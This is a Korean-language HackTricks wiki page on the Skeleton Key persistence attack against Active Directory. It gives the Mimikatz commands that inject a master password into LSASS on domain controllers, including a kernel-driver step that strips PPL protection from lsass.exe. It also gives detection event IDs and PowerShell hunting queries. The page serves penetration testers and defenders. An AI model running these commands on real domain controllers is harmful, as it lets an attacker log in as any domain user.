# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

**Skeleton Key attack**은 각 domain controller의 LSASS 프로세스에 **master password**를 **주입**하여 **Active Directory 인증을 우회**할 수 있게 하는 기법입니다. 주입 후에는 사용자의 실제 password가 여전히 작동하는 상태에서 master password(기본값 **`mimikatz`**)를 사용하여 **모든 domain user로 인증**할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

주요 사항:

- 모든 DC에서 **Domain Admin/SYSTEM + SeDebugPrivilege**가 필요하며, **재부팅할 때마다 다시 적용해야** 합니다.<sup>[[2]](#references)</sup>
- 기존 Mimikatz 구현은 **NTLM** 및 **Kerberos RC4 (etype 0x17)** validation path를 patch합니다. AES 전용 인증은 **RC4 hook을 통한 skeleton password를 허용하지 않습니다**.<sup>[[2]](#references)</sup>
- 타사 LSA authentication package 또는 추가 smart-card / MFA provider와 충돌할 수 있습니다.<sup>[[2]](#references)</sup>
- Mimikatz module은 호환성 문제가 발생할 경우 Kerberos/AES hook을 건드리지 않도록 선택적 switch `/letaes`를 지원합니다.<sup>[[3]](#references)</sup>

### Execution

기본적인 PPL 비보호 LSASS:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
**LSASS가 protected process light (PPL)**로 실행 중이면 user-mode debug access가 차단됩니다. 아래의 기존 Mimikatz 절차는 kernel driver를 로드하고 보호를 제거한 후 LSASS를 patch합니다. Credential Guard는 별도의 isolation control이며 PPL과 동의어로 사용해서는 안 됩니다.<sup>[[3]](#references)[[4]](#references)</sup>
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
주입 후 모든 도메인 계정으로 인증하되, 비밀번호로 `mimikatz`(또는 operator가 설정한 값)를 사용합니다. 다중 DC 환경에서는 **모든 DC**에서 반복해야 합니다.

## Mitigations

- **로그 모니터링**
- 시스템 **Event ID 7045**(서비스/드라이버 설치)에서 `mimidrv.sys`와 같은 서명되지 않은 드라이버를 확인합니다.
- **Sysmon**: `mimidrv.sys`의 Event ID 7(드라이버 로드), 시스템 프로세스가 아닌 프로세스에서 `lsass.exe`에 의심스럽게 접근하는 Event ID 10을 확인합니다.
- 민감한 권한 사용 또는 LSA authentication package 등록 이상에 대한 Security **Event ID 4673/4611**을 확인하고, DC에서 RC4(etype 0x17)를 사용하는 예상치 못한 4624 로그온과 상관 분석합니다.
- **LSASS 강화**
- 지원되는 환경에서는 **RunAsPPL**과 **Credential Guard**를 활성화된 상태로 유지합니다. 두 기능은 서로 다른 보호를 제공하며, 함께 사용하면 LSASS 비밀을 수정하거나 추출하려는 시도의 비용과 관련 telemetry가 증가합니다.<sup>[[4]](#references)</sup>
- 가능한 경우 레거시 **RC4**를 비활성화합니다. AES로 제한된 Kerberos 티켓은 skeleton key에서 사용하는 RC4 hook 경로를 차단합니다.<sup>[[2]](#references)</sup>
- 간단한 PowerShell hunts:
- 서명되지 않은 kernel driver 설치 탐지: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Mimikatz driver hunt: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- 재부팅 후 PPL 적용 여부 확인: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

추가적인 credential-hardening 지침은 [Windows credentials protections](../stealing-credentials/credentials-protections.md)을 참조하세요.

## References

- [1] [Netwrix – Active Directory의 Skeleton Key attack (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [2] [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [3] [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)
- [4] [Microsoft Learn — 추가된 LSA 보호 구성](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
